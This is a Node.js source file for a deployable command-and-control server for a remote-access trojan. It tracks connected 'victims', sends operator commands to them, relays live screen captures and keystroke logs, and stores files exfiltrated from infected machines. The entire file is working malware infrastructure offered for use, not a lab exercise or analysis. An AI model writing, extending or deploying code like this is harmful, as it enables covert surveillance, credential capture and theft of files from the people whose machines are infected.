// ═══════════════════════════════════════════════════════════════
//  C2 Server — Railway-ready
//  - process.env.PORT support
//  - Token auth (ADMIN_TOKEN, VICTIM_TOKEN)
//  - Heartbeat (Railway idle-kill prevent)
//  - Volume-based upload dir
// ═══════════════════════════════════════════════════════════════

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ─── Config (Railway env vars) ─────────────────────────────────
const PORT        = process.env.PORT        || 4444;
const UPLOAD_DIR  = process.env.UPLOAD_DIR  || './uploads';
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'change-me-admin';
const VICTIM_TOKEN= process.env.VICTIM_TOKEN|| 'change-me-victim';

if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use('/uploads', express.static(UPLOAD_DIR));

// ─── In-memory state ───────────────────────────────────────────
const victims = new Map();   // victimId -> { ws, info, connected }
const admins  = new Map();   // adminId  -> ws

const upload = multer({ dest: UPLOAD_DIR });

// ─── WebSocket Handler ─────────────────────────────────────────
wss.on('connection', (ws, req) => {
  ws._id = uuidv4();
  ws._type = null;
  ws.isAlive = true;
  ws.on('pong', () => (ws.isAlive = true));

  // Extract token from query string:  ?token=xxx
  let token = null;
  try {
    const url = new URL(req.url, 'http://x');
    token = url.searchParams.get('token');
  } catch (_) {}

  ws.on('message', (raw) => {
    let msg;
    try { msg = JSON.parse(raw); } catch { return; }

    // ── Victim registration ──
    if (msg.type === 'register_victim') {
      if (token !== VICTIM_TOKEN) {
        ws.send(JSON.stringify({ type: 'error', msg: 'invalid victim token' }));
        return ws.close(4001, 'bad victim token');
      }
      ws._type = 'victim';
      victims.set(ws._id, {
        ws,
        id: ws._id,
        info: msg.info || {},
        connected: new Date().toISOString()
      });
      console.log(`[+] Victim connected: ${ws._id} | ${JSON.stringify(msg.info || {})}`);
      broadcastToAdmins({
        type: 'victim_connected',
        victim: { id: ws._id, info: msg.info || {}, connected: victims.get(ws._id).connected }
      });
      return;
    }

    // ── Admin registration ──
    if (msg.type === 'register_admin') {
      if (token !== ADMIN_TOKEN) {
        ws.send(JSON.stringify({ type: 'error', msg: 'invalid admin token' }));
        return ws.close(4001, 'bad admin token');
      }
      ws._type = 'admin';
      admins.set(ws._id, ws);
      console.log(`[+] Admin connected: ${ws._id}`);
      const list = [];
      victims.forEach(v => list.push({ id: v.id, info: v.info, connected: v.connected }));
      ws.send(JSON.stringify({ type: 'victim_list', victims: list }));
      return;
    }

    // ── Admin → Victim command ──
    if (msg.type === 'command' && ws._type === 'admin') {
      const v = victims.get(msg.victimId);
      if (!v || v.ws.readyState !== WebSocket.OPEN) {
        return ws.send(JSON.stringify({ type: 'error', msg: 'victim offline', reqId: msg.reqId }));
      }
      v.ws.send(JSON.stringify({
        type: 'cmd', cmd: msg.cmd, args: msg.args, reqId: msg.reqId
      }));
      return;
    }

    // ── Victim → Admins ──
    if (ws._type === 'victim') {

      if (msg.type === 'response') {
        broadcastToAdmins({ type: 'response', victimId: ws._id, ...msg });
        return;
      }

      if (msg.type === 'screen_frame') {
        broadcastToAdmins({
          type: 'screen_frame', victimId: ws._id,
          frame: msg.frame, ts: Date.now()
        });
        return;
      }

      if (msg.type === 'keylog') {
        broadcastToAdmins({
          type: 'keylog', victimId: ws._id,
          data: msg.data, ts: Date.now()
        });
        return;
      }

      if (msg.type === 'file_chunk') {
        const dir = path.join(UPLOAD_DIR, ws._id);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        const buf = Buffer.from(msg.data, 'base64');
        fs.appendFileSync(path.join(dir, msg.filename), buf);
        if (msg.last) {
          broadcastToAdmins({
            type: 'file_ready',
            victimId: ws._id,
            filename: msg.filename,
            url: `/uploads/${ws._id}/${msg.filename}`
          });
        }
        return;
      }
    }
  });

  ws.on('close', () => {
    if (ws._type === 'victim') {
      victims.delete(ws._id);
      broadcastToAdmins({ type: 'victim_disconnected', victimId: ws._id });
      console.log(`[-] Victim disconnected: ${ws._id}`);
    } else if (ws._type === 'admin') {
      admins.delete(ws._id);
      console.log(`[-] Admin disconnected: ${ws._id}`);
    }
  });

  ws.on('error', () => {});
});

// ─── Heartbeat every 25s ───────────────────────────────────────
setInterval(() => {
  wss.clients.forEach(ws => {
    if (!ws.isAlive) return ws.terminate();
    ws.isAlive = false;
    ws.ping();
  });
}, 25000);

function broadcastToAdmins(obj) {
  const str = JSON.stringify(obj);
  admins.forEach(ws => {
    if (ws.readyState === WebSocket.OPEN) ws.send(str);
  });
}

// ─── REST API ──────────────────────────────────────────────────
app.get('/', (req, res) => res.send('C2 running'));

app.get('/api/victims', (req, res) => {
  const list = [];
  victims.forEach(v => list.push({ id: v.id, info: v.info, connected: v.connected }));
  res.json(list);
});

app.get('/api/files/:victimId', (req, res) => {
  const dir = path.join(UPLOAD_DIR, req.params.victimId);
  if (!fs.existsSync(dir)) return res.json([]);
  res.json(fs.readdirSync(dir));
});

// ─── Start ─────────────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', () => {
  console.log(`[C2] Running on :${PORT}`);
  console.log(`[C2] Upload dir: ${UPLOAD_DIR}`);
  console.log(`[C2] Admin token set: ${ADMIN_TOKEN !== 'change-me-admin'}`);
  console.log(`[C2] Victim token set: ${VICTIM_TOKEN !== 'change-me-victim'}`);
});